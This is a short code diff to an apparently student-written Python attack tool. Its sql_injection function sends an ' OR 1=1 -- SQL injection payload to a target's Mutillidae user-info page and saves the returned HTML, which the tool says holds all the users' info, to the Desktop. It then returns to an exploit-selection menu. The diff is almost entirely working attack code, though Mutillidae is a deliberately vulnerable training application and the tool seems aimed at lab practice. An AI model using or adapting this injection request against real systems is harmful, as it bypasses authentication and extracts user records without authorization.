@@ -348,11 +348,14 @@ def sql_injection():
     target = input()
     print("[-] Attempting an SQL injection attack...")
     
-    r = requests.post(target, json={"username": "' OR 1=1 --'", "password": ""})
+    r = requests.post("http://"+target+"/mutillidae/index.php?page=user-info.php&username='+OR+1%3D1+--+'&password=&user-info-php-submit-button=View+Account+Details", 
+        json={"username": "' OR 1=1 --'", "password": ""})
 
-    print(r.text)
+    with open("Desktop/response.html", "w") as file:
+        file.write(r.text)
 
-    time.sleep(5)
+    print("Saved in Desktop the html page with all the users info!")
+    time.sleep(60)
     choose_exploit()
 
 def choose_recon():
